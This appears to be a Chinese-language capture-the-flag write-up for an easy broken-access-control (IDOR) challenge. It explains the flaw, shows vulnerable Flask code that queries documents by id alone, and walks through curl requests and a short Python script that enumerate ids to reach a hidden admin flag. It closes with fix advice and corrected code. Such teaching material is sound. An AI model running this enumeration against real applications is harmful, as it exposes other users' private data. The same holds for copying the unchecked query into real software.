# A01 Broken Access Control - Easy - WriteUP

## 漏洞分析

本题是一个典型的 **IDOR（Insecure Direct Object Reference，不安全直接对象引用）** 漏洞。

### 漏洞原理

应用程序使用用户可控的参数（`doc_id`）直接访问数据库中的对象，但**没有验证当前用户是否有权限访问该对象**。这意味着：

1. 用户 `alice` 的文档 ID 是 1-3
2. 但后端在查询文档时，只使用了 `id` 作为条件，没有加上 `owner = 'alice'` 的限制
3. 因此，修改 `id` 参数就可以查看其他用户的文档

### 漏洞代码分析

```python
@app.route("/doc")
def view_doc():
    doc_id = request.args.get("id", "1")
    # ... 只根据 id 查询，没有校验 owner
    c.execute("SELECT id, title, content, owner FROM documents WHERE id = ?", (doc_id,))
```

**正确做法**应该是：
```python
c.execute("SELECT id, title, content, owner FROM documents WHERE id = ? AND owner = ?", (doc_id, "alice"))
```

## 利用步骤

### 步骤1：访问首页，查看正常文档

```bash
curl http://<target>/doc?id=1
```

可以看到文档正常显示。

### 步骤2：尝试修改 doc_id 参数

```bash
curl "http://<target>/doc?id=0"
curl "http://<target>/doc?id=4"
curl "http://<target>/doc?id=5"
curl "http://<target>/doc?id=6"
```

或者直接在浏览器中访问：
- `http://<target>/doc?id=0`
- `http://<target>/doc?id=4`

### 步骤3：获取 flag

访问 `http://<target>/doc?id=0`，页面显示：

```
系统管理文档
文档ID: 0
作者: admin
恭喜你发现了隐藏的flag！flag{...}
```

### EXP 脚本

```python
import requests

target = "http://<target>"

for i in range(0, 10):
    r = requests.get(f"{target}/doc", params={"id": i})
    if "flag{" in r.text:
        start = r.text.index("flag{")
        end = r.text.index("}", start) + 1
        print(f"Found flag at id={i}: {r.text[start:end]}")
        break
```

## 修复建议

1. **添加权限校验**：在查询文档时，必须同时校验文档的 owner 是否与当前登录用户匹配
2. **使用间接引用映射**：不直接暴露数据库 ID，而是使用随机的 UUID 或哈希值
3. **纵深防御**：在控制器层和服务层都进行权限检查

示例修复代码：

```python
@app.route("/doc")
def view_doc():
    doc_id = request.args.get("id", "1")
    current_user = get_current_user()  # 从 session 获取
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "SELECT id, title, content, owner FROM documents WHERE id = ? AND owner = ?",
        (doc_id, current_user)
    )
    doc = c.fetchone()
    conn.close()
    
    if not doc:
        return "无权访问或文档不存在", 403
    
    return render_template_string(HTML_TEMPLATE, doc=doc)
```
